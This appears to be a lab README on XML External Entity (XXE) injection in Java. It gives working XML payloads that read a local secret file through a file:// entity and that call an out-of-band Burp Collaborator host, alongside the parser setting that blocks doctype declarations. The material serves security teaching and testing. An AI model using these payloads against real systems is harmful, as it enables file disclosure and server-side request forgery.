# eXternal XML Entities

### useful links

[Эксплуатация уязвимостей eXternal Entity XML (XXE)](https://habr.com/ru/company/pentestit/blog/325270/)

[XML-entities](https://portswigger.net/web-security/xxe/xml-entities)

[XXEinjector](https://github.com/enjoiz/XXEinjector)

Define XML-entity with DTD

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
        <!ELEMENT foo ANY>
        <!ENTITY xxe "XXE Vulnarability Test">
        <!ENTITY xxe2 "XXE Vulnarability Test 02">
        ]>
<bill>
    <product id="26">
        <name>&xxe;</name>
        <quantity>0</quantity>
        <price>0</price>
    </product>
    <product id="28">
        <name>&xxe2;</name>
        <quantity>1</quantity>
        <price>1337</price>
    </product>
    <product id="30">
        <name>Dev stuff</name>
        <quantity>30</quantity>
        <price>1000</price>
    </product>
</bill>
```

Define external XML-entity

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE boo [
        <!ENTITY xxe SYSTEM "file:////C:\\Git\\java\\java-security-labs\\labs\\lab-xxe\\xmls\\mySecretFile">
        ]>
<bill>
    <product id="26">
        <name>&xxe;</name>
        <quantity>0</quantity>
        <price>0</price>
    </product>
    <product id="28">
        <name>Coolhacker</name>
        <quantity>1</quantity>
        <price>1337</price>
    </product>
    <product id="30">
        <name>Dev stuff</name>
        <quantity>30</quantity>
        <price>1000</price>
    </product>
</bill>
```

Preserve XXE-injection
```java
DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
dbFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```
result of injection is:
```java
SAXException was thrown: DOCTYPE is disallowed
```

XXE-injection with server
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE boo [
        <!ENTITY xxe SYSTEM "http://gyiv38a8htdpb0m9zfr7w95tkkqaez.burpcollaborator.net">
        ]>
<bill>
    <product id="26">
        <name>&xxe;</name>
        <quantity>0</quantity>
        <price>0</price>
    </product>
</bill>
```
